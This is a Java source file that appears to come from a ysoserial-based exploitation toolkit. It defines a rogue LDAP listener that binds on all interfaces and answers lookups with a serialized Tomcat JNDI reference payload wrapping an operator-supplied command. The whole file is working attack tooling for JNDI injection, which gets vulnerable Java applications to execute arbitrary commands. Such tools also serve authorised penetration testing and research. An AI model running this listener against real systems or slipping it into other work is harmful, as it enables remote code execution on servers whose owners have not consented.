package ysoserial.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import ysoserial.Serializer;
import ysoserial.exploit.ldap.component.LocalChainOperationInterceptor;
import ysoserial.bullet.jndi.TomcatRef;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPTomcatRefListener {
    private InMemoryDirectoryServer ds;

    public LDAPTomcatRefListener(int lport, TomcatRef ref, String command) throws Exception {
        InMemoryDirectoryServerConfig config = null;
        config = new InMemoryDirectoryServerConfig("dc=fasdqa" + ",dc=com");
        config.setListenerConfigs(new InMemoryListenerConfig(
            "listen", //$NON-NLS-1$
            InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
            lport,
            ServerSocketFactory.getDefault(),
            SocketFactory.getDefault(),
            (SSLSocketFactory) SSLSocketFactory.getDefault()));
        config.addInMemoryOperationInterceptor(
            new LocalChainOperationInterceptor(Serializer.serialize(ref.getObject(command))));
        ds = new InMemoryDirectoryServer(config);
    }

    public void run() throws LDAPException {
        ds.startListening();
    }

    public static void main(String[] args)  throws Exception{
        if ( args.length != 3 ) {
            System.err.println(LDAPTomcatRefListener.class.getName() + " <port> <ref_type> <payload_arg>");
            System.exit(-1);
            return;
        }

        try {
            int port = Integer.parseInt(args[0]);
            String refClassName = "ysoserial.payloads.jndi." + args[1];
            TomcatRef ref = Class.forName(refClassName).asSubclass(TomcatRef.class).newInstance();
            LDAPTomcatRefListener ldapTomcatRefListener = new LDAPTomcatRefListener(port, ref, args[2]);
            ldapTomcatRefListener.run();
        } catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }
}
